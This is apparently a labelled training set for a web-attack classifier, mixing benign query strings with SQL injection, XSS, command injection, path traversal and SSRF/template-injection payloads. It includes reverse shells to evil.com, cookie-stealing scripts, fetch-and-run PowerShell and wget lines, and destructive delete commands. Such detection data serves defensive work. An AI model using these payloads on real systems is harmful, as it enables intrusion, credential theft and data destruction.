"payload","label"
"id=7&user=bob&page=3&email=bob%40example.com&token=abcdef","0"
"token=abcdef&email=bob%40example.com&lang=en&name=Alice","0"
"format=json&filter=active&debug=false&id=7","0"
"comment=<script>alert(1)</script>","2"
"/var/www/html/.htpasswd","4"
"/etc/hosts","4"
"lang=en","0"
"`cat /etc/passwd`","3"
"/*!UNION*/ SELECT 1","1"
"page=3&category=books","0"
"1/**/UNION/**/SELECT/**/1,2,3","1"
"page=2","0"
"category=books","0"
"lang=en","0"
"0x61646d696e","1"
"lang=en&format=json&user=bob&debug=false&email=bob%40example.com","0"
"category=books&user=bob&format=json&token=abcdef","0"
"preview=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==","0"
"offset=0","0"
"The product arrived damaged, please help.","0"
"'; EXEC sp_MSforeachtable('DROP TABLE ?')--","1"
"My order number is 12345 and I have a question.","0"
"<script>document.write('<img src=x onerror=alert(1)>')</script>","2"
"category=books&debug=false&token=abcdef&format=json","0"
"timezone=America%2FNew_York","0"
"file:///c:/windows/win.ini","4"
"firstname=Jane&lastname=Smith&phone=%2B1-555-0100","0"
"////../../../etc/passwd","4"
"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==","5"
"${jndi:ldap://evil.com/a}","5"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://evil.com/ssrf'>]>","5"
"/* comment */ SELECT 1","1"
"1 OR 1=1","1"
"/js/app.js","0"
"name=Alice&user=bob&category=books","0"
"page=3&q=test&format=json","0"
"category=books","0"
"<script>alert(1)/*","2"
"email=bob%40example.com","0"
"<iframe src=javascript:alert(1)>","2"
"page=3&user=bob&limit=20&email=bob%40example.com","0"
"limit=20&sort=asc&debug=false&q=test","0"
"lang=en&q=test&offset=0&limit=20","0"
"category=books&limit=20&name=Alice","0"
"1 OR 1=1","1"
"0x41424344","1"
"lang=en&id=7","0"
"category=books","0"
"filter=active&user=bob&q=test","0"
"& set","3"
"token=abcdef&q=test","0"
"sort=asc&user=bob&id=7&limit=20","0"
"lang=en&format=json&limit=20&debug=false","0"
"limit=20","0"
"category=books&offset=0&name=Alice","0"
"debug=false&category=books&email=bob%40example.com","0"
"id=7&offset=0&q=test","0"
"email=bob%40example.com","0"
"sort=asc&user=bob&lang=en&token=abcdef&filter=active","0"
"format=json&id=7&debug=false&q=test&lang=en","0"
"C:\Windows\System32\drivers\etc\hosts","4"
"..%00/etc/passwd","4"
"select * from users","1"
"&& ls","3"
"/oauth/callback?code=abc&state=xyz","0"
"/products/search?q=laptop","0"
"page=3&sort=asc&offset=0&token=abcdef&category=books","0"
"sort=asc&lang=en","0"
"1 OR 1=1","1"
"<object data=javascript:alert(1)>","2"
"debug=false&sort=asc","0"
"1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"; touch /tmp/pwned","3"
"<script>window.location='http://evil.com?c='+document.cookie</script>","2"
"' OR 'a'='a","1"
"{""file_name"": ""report_q4_2024.pdf"", ""format"": ""pdf"", ""size_bytes"": 2048576}","0"
"email=bob%40example.com&offset=0&id=7","0"
"page=3","0"
"<body background=javascript:alert(1)>","2"
"q=test","0"
"data_export_2024_01_15.csv","0"
"`id`","3"
"user_id=12345&action=view&format=json","0"
"id=7&token=abcdef&category=books&name=Alice&format=json","0"
"http://evil.com","5"
"{""query"": ""how to learn python"", ""page"": 1, ""limit"": 20}","0"
"page=3","0"
"http://localhost:8080/admin","5"
"..%5Cetc%5Cpasswd","4"
"id=7","0"
"format=json&sort=asc&token=abcdef&lang=en&offset=0","0"
"format=json&q=test&id=7&token=abcdef","0"
"version=3.1.4","0"
"host=example.com | cat /etc/shadow","3"
"#{7*7}","5"
"/api/v2/products/42","0"
"I would like to reset my password.","0"
"filter=active","0"
"limit=20&q=test&category=books&name=Alice","0"
"expect://ls","4"
"id=7&token=abcdef&lang=en&debug=false","0"
"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0","0"
"| bash -i >& /dev/tcp/evil.com/4444 0>&1","3"
"debug=false","0"
"id=1' OR '1'='1","1"
"id=7&lang=en&q=test&sort=asc","0"
"1 & ls #","3"
"; cmd /c dir","3"
"limit=20&email=bob%40example.com&sort=asc&token=abcdef","0"
"token=abcdef&offset=0&filter=active&sort=asc&q=test","0"
"q=test&lang=en&user=bob","0"
"'-confirm(1)-'","1"
"0x75736572","1"
"1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)--","1"
"user=bob","0"
"/checkout/cart","0"
"' AND SUBSTRING(username,1,1)='a'--","1"
"O:4:""Slim""","5"
""" OR ""1""=""1","1"
"lat=40.7128&lng=-74.0060&radius=10&unit=km","0"
"debug=false&sort=asc&email=bob%40example.com&lang=en&filter=active","0"
"lang=en&format=json&limit=20&page=3&q=test","0"
"/health","0"
"page=3&name=Alice&sort=asc&filter=active","0"
"offset=0&name=Alice","0"
"<isindex type=image src=1 onerror=alert(1)>","2"
"q=test&name=Alice&token=abcdef","0"
"python-requests/2.31.0","0"
"php://input","4"
"q=test&debug=false&limit=20&token=abcdef","0"
"id=1&id=1' OR '1'='1","1"
"q=1'; SLEEP(5)--","1"
"/profile/settings","0"
"; find / -name '*.conf' 2>/dev/null","3"
"<ScRiPt>alert(1)</ScRiPt>","2"
"offset=0&lang=en&user=bob","0"
"<img src=1 href=1 onerror=""javascript:alert(1)"">","2"
"page=3&format=json&token=abcdef&debug=false&limit=20","0"
"; bash -i >& /dev/tcp/evil.com/4444 0>&1","3"
"offset=0&limit=20&user=bob&id=7&token=abcdef","0"
"sort=asc","0"
"1%0bOR%0bround(pi())%3d3%0bAND%0b1%3d1","1"
"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==","2"
"debug=false&category=books&sort=asc","0"
"filter=active&id=7","0"
"' ORDER BY 1--","1"
"<input onfocus=alert(1) autofocus>","2"
"/proc/cmdline","4"
"http://169.254.169.254/latest/meta-data/iam/security-credentials/","5"
"' OR ''=''","1"
"| wget http://evil.com/shell.sh","3"
"<script>\u0061lert(1)</script>","2"
"{{config}}","5"
"page=3","0"
"format=json","0"
"a`id`b","3"
"description=This & That: A Guide to Modern Cooking","0"
"& curl http://evil.com/c2","3"
"email=bob%40example.com&offset=0","0"
"debug=false&limit=20","0"
"address=123+Main+St&city=Springfield&state=IL&zip=62701","0"
"filename=test.txt; cat /etc/passwd","3"
"https://shop.example.com/cart?item=123&qty=2&coupon=SAVE10","0"
"file:///etc/passwd","4"
"debug=false&offset=0&name=Alice&token=abcdef&filter=active","0"
"admin' OR '1'='1' /*","1"
"php://filter/convert.base64-encode/resource=index.php","4"
"email=bob%40example.com&lang=en&limit=20&page=3","0"
"; powershell -c ""IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')""","3"
"' UNION SELECT NULL,NULL,NULL,NULL--","1"
"; env","3"
"id=7&offset=0&lang=en","0"
"' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--","1"
"limit=20&filter=active&debug=false","0"
"token=abcdef&filter=active&lang=en","0"
"category=books&user=bob&offset=0&limit=20&page=3","0"
"id=1%0bOR%0bround(pi())%3d3","1"
"' GROUP BY users.id HAVING 1=1--","1"
"& powershell -exec bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')""","3"
"<meta http-equiv=refresh content='0;url=javascript:alert(1)'>","2"
"user=bob","0"
"offset=0&limit=20&sort=asc","0"
"1%0bAND%0bsin(pi())%3d0","1"
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>","2"
"1 AND PG_SLEEP(5)","1"
"filter=active&category=books","0"
"1; ls #","3"
"& del /f /q C:\Windows\System32\*","3"
"height=auto","0"
"| id","3"
"
 ls","3"
"name=admin'--","1"
"name=Alice","0"
"style=color:red","0"
"token=abcdef&q=test&page=3&filter=active&debug=false","0"
"https://api.example.com/v1/users?page=2&limit=10","0"
"lang=en&limit=20&q=test","0"
"lang=en&q=test&sort=asc&limit=20","0"
"query=how+to+cook+pasta","0"
"lang=en","0"
"name=Alice&debug=false&user=bob&page=3&limit=20","0"
"Hello, how are you today?","0"
"name=Alice&email=bob%40example.com","0"
"q=test&debug=false&email=bob%40example.com","0"
"| find / -perm -4000 -type f 2>/dev/null","3"
"email=bob%40example.com","0"
"/proc/version","4"
"page=3&limit=20&q=test","0"
"onblur=alert(1)","2"
"format=json&page=3&lang=en","0"
"q='""><script>fetch('http://evil.com')</script>","2"
"/.well-known/acme-challenge/token123","0"
"& ls","3"
"page=3&sort=asc&name=Alice","0"
"/etc/mysql/my.cnf","4"
"http://[::1]:80/","5"
"filter=active&limit=20&offset=0&debug=false&email=bob%40example.com","0"
"/%2F/evil.com","5"
"token=abcdef&email=bob%40example.com","0"
"token=abcdef&offset=0","0"
"email=bob%40example.com","0"
"q=test&category=books&format=json","0"
"limit=20","0"
"; ls -la","3"
"1 OR 2>1","1"
"page=3","0"
"; ps aux","3"
"Can you please update my shipping address?","0"
"/etc/shadow","4"
"filter=active","0"
"/api/v1/users","0"
"1|{cat,/etc/passwd}","3"
"page=3&token=abcdef&sort=asc","0"
"client_id=my-app-client-id","0"
"comment=javascript:alert(1)","2"
"' OR 1=1 LIMIT 1 --","1"
"debug=false&token=abcdef","0"
"token=abcdef&name=Alice&debug=false&lang=en&sort=asc","0"
"& ipconfig /all","3"
"<math href=javascript:alert(1)>click</math>","2"
"/%2e%2e/%2e%2e/%2e%2e/etc/passwd","4"
"search=docker+tutorial+beginners","0"
"name=Alice","0"
"/dashboard","0"
"id=42","0"
"comment=<svg onload=alert(1)>","2"
"<%= system('id') %>","5"
"data:text/html,<script>alert(1)</script>","2"
"/proc/self/environ","4"
"email=bob%40example.com&user=bob&category=books&token=abcdef&page=3","0"
"1 ORDER BY 3--","1"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>","5"
"..././etc/passwd","4"
"; perl -e 'use Socket;$i=""evil.com"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'","3"
"report_2024.pdf","0"
"& tasklist","3"
"%2e%2e/%2e%2e/etc/passwd","4"
"1 UNION SELECT @@version,null,null","1"
"offset=50","0"
"'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--","1"
"..%c1%9cetc%c1%9cpasswd","4"
"test$(id)test","3"
"id=7&name=Alice&lang=en&offset=0&user=bob","0"
"name=<script>alert(1)</script>","2"
"'; EXEC xp_cmdshell('dir')--","1"
"id=7","0"
"debug=false","0"
"limit=20&token=abcdef","0"
"| ls","3"
"gopher://localhost:6379/_PING","5"
"<img src=""x"" onerror=""alert(1)"">","2"
"limit=20&offset=0&sort=asc&user=bob&name=Alice","0"
"token=abcdef&offset=0&page=3","0"
"| ncat evil.com 4444 -e /bin/bash","3"
"admin' #","1"
"1' AND MID(version(),1,1)='5'--","1"
"1' AND SLEEP(5)--","1"
"1 AND SIN(PI()/2)=1","1"
"username=john&password=MySecureP%40ss123","0"
"1 ORDER BY 100--","1"
"' OR 0x01","1"
"score=95.5","0"
"category=books&filter=active","0"
"../../../../../../../../../windows/system32/cmd.exe","4"
"1 AND (SELECT COUNT(*) FROM mysql.user)>0--","1"
"' AND ASCII(SUBSTRING(password,1,1))>64--","1"
"1%0bUNION%0bSELECT%0b1,2,3","1"
"<script>fetch('http://evil.com?data='+document.cookie)</script>","2"
"' OR 1=1--","1"
"/api/v1/users/42","0"
"offset=0&token=abcdef","0"
"/checkout/success","0"
"user=bob","0"
"{""items"": [1, 2, 3], ""total"": 3, ""page"": 1}","0"
"user=bob&debug=false&q=test","0"
"token=abcdef&email=bob%40example.com&id=7&debug=false","0"
"1 OR POWER(1,1)=1","1"
"action=update&field=email&value=new%40email.com","0"
"filter=active&category=books&email=bob%40example.com&debug=false","0"
"user=bob&lang=en&token=abcdef","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","2"
"/var/lib/mlocate/mlocate.db","4"
"format=json","0"
"category=books&format=json&user=bob","0"
"format=json","0"
"
 ls","3"
"<style>*{background:url('javascript:alert(1)')}</style>","2"
"PostmanRuntime/7.32.3","0"
"name=John+Doe&email=john%40example.com&message=Hello+there","0"
"1 OR 1=1; --","1"
"CHAR(65,68,77,73,78)","1"
"1;{ls,-la}","3"
"<script>alert(1)</script>","2"
"q=test&lang=en&email=bob%40example.com","0"
"vbscript:msgbox('XSS')","2"
"sort=asc&q=test&category=books","0"
"/favicon.ico","0"
"sort=asc&id=7&q=test&email=bob%40example.com&debug=false","0"
"select password from admin","1"
"limit=20&name=Alice&offset=0&q=test&id=7","0"
"user=admin","0"
"sort=asc&debug=false&user=bob&limit=20","0"
"id=1","0"
"..%2F..%2Fetc%2Fpasswd","4"
"1' OR '1'='1'%00--","1"
"lang=en&sort=asc&token=abcdef&offset=0&limit=20","0"
"| printenv","3"
"user=bob&id=7&debug=false","0"
"' UNION SELECT username, password, 3 FROM users--","1"
"php://stdin","4"
"search=1; DROP TABLE users--","1"
"user=bob&offset=0&name=Alice&lang=en","0"
"javascript:alert('XSS')","2"
"/settings/profile/update","0"
"page=3&name=Alice&sort=asc","0"
"debug=false","0"
"count=10","0"
"category=books&q=test&limit=20&token=abcdef&sort=asc","0"
"file.txt","0"
"document.write('<script>alert(1)</script>')","2"
"offset=0&name=Alice&email=bob%40example.com","0"
"page=3&q=test&category=books&lang=en&debug=false","0"
"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;","2"
"email=bob%40example.com&id=7&lang=en&sort=asc&debug=false","0"
"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}","5"
"%27%20OR%20%271%27%3D%271%20--","1"
"pg_sleep(5)--","1"
"<audio src=1 href=1 onerror=""javascript:alert(1)"">","2"
"&#60;script&#62;alert(1)&#60;/script&#62;","2"
"session=abc123def456ghi789","0"
"q=test&sort=asc&filter=active","0"
"debug=false&sort=asc","0"
"select load_file('/etc/passwd')","1"
"& ver","3"
"search=laptop+under+1000","0"
"x' OR 1=1 LIMIT 1--","1"
"offset=0&format=json","0"
"format=json&category=books&sort=asc","0"
"<div onmouseover=alert(1)>hover</div>","2"
"limit=25","0"
"offset=0&token=abcdef&filter=active&limit=20&user=bob","0"
"..%c0%afetc%c0%afpasswd","4"
"role=user","0"
"debug=false","0"
"<a href='vbscript:msgbox(1)'>click</a>","2"
"category=books","0"
"/var/log/apache/access.log","4"
"user=admin' AND 1=1--","1"
"/api/callback?code=abc123&state=xyz789","0"
"filter=active&offset=0&limit=20&category=books","0"
"sort=asc&lang=en","0"
"debug=false&page=3&lang=en","0"
"amount=100.00","0"
"| netstat -tulpn","3"
"<video src=1 href=1 onerror=""javascript:alert(1)"">","2"
"' HAVING 1=1--","1"
"filter=active&email=bob%40example.com","0"
"&lt;script&gt;alert(1)&lt;/script&gt;","2"
"page=3&sort=asc&name=Alice&debug=false&offset=0","0"
"name=Alice&format=json&category=books","0"
"offset=0&sort=asc&format=json&token=abcdef&category=books","0"
"..\.\etc\passwd","4"
"|| ls","3"
"{""username"": ""alice"", ""password"": ""correct-horse-battery""}","0"
"format=json&sort=asc","0"
"comment=<img src=x onerror=alert(1)>","2"
"page=1","0"
"lang=en&email=bob%40example.com","0"
"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">","2"
"; shutdown -h now","3"
"q=test","0"
"Googlebot/2.1 (+http://www.google.com/bot.html)","0"
"q=best+hotels+in+paris","0"
"name=Alice&filter=active&q=test&lang=en&id=7","0"
"lang=en&category=books&filter=active&name=Alice&limit=20","0"
"host=localhost; id","3"
"id=100","0"
"token=abcdef&debug=false&limit=20","0"
"1' GROUP BY CONCAT(version(),0x3a,floor(rand(0)*2)) HAVING MIN(0)--","1"
"1/**/OR/**/1=1","1"
"//evil.com","5"
"1' AND '1'='1","1"
"<svg onload=alert`1`>","2"
"window.location='http://evil.com'","2"
"page=3&q=test","0"
"| cmd /c ipconfig","3"
"; uname -a","3"
"Please send me information about your products.","0"
"../etc/passwd","4"
"../../../../windows/win.ini","4"
"name=Alice&q=test","0"
"0; DROP TABLE--","1"
"sort=asc&format=json&token=abcdef&offset=0","0"
"' UNION SELECT null,null,null--","1"
"/etc/php.ini","4"
"value=3.14159","0"
"1 AND 1=2 UNION SELECT username,password FROM users--","1"
"debug=false","0"
"ftp://anonymous@localhost/","5"
"q=test&email=bob%40example.com&limit=20&filter=active","0"
"id=7&format=json","0"
"email=bob%40example.com","0"
"lang=en&debug=false&q=test&category=books&id=7","0"
"%2e%2e%2fetc%2fpasswd","4"
"<body onload=alert(1)>","2"
"curl/8.4.0","0"
"search=na%C3%AFve+algorithm","0"
"; rm -rf /tmp/*","3"
"${7*7}","5"
"id=7","0"
"C:\boot.ini","4"
"redirect_uri=https%3A%2F%2Fmyapp.com%2Foauth%2Fcallback","0"
"id=7&category=books&filter=active&lang=en","0"
"debug=false&name=Alice&q=test&sort=asc","0"
"filter=active&category=books","0"
"1'/**/UNION/**/SELECT/**/1,2,3--","1"
"1 AND 1=(SELECT 1 FROM dual)--","1"
"<<script>alert(1);//<</script>","2"
"limit=20&user=bob","0"
"debug=false&sort=asc&filter=active","0"
"user=bob","0"
"' UNION SELECT 1,2,3--","1"
"....\\etc\passwd","4"
"token=abcdef&sort=asc&debug=false","0"
"....//etc/passwd","4"
"id=0x41","1"
"../../../etc/passwd","4"
"<input type=text value=""<script>alert(1)</script>"">","2"
"id=7","0"
"id=7&email=bob%40example.com&format=json&limit=20&user=bob","0"
"..\etc\passwd","4"
"format=json","0"
"name=Fran%C3%A7ois&city=Montr%C3%A9al","0"
"email=bob%40example.com","0"
"' ORDER BY 5--","1"
"; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s","3"
"& id","3"
"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""evil.com"",4444));subprocess.call([""/bin/sh"",""-i""],stdin=s.fileno())'","3"
"filter=active","0"
"lang=en-US","0"
"name=Alice&format=json&filter=active&email=bob%40example.com&user=bob","0"
"/etc/passwd","4"
"onfocus=alert(1)","2"
"1 AND ROUND(PI())=3","1"
"from=2024-01-01&to=2024-12-31","0"
"I need to cancel my order #98765.","0"
"dict://localhost:11211/","5"
"1 GROUP BY 1,2--","1"
"q=python+tutorial","0"
"1' AND PG_SLEEP(5)--","1"
"name=onerror=alert(1)","2"
"{{7*7}}","5"
"| cat /etc/passwd","3"
"admin%00' OR '1'='1","1"
"debug=false&offset=0","0"
"filter=active&lang=en&user=bob&category=books","0"
"javascript:alert(1)","2"
"1 OR EXP(0)=1 AND 1=1","1"
"'; EXEC(0x53454c454354203120)--","1"
"; ifconfig","3"
"filename=file.txt && wget http://evil.com/shell.sh","3"
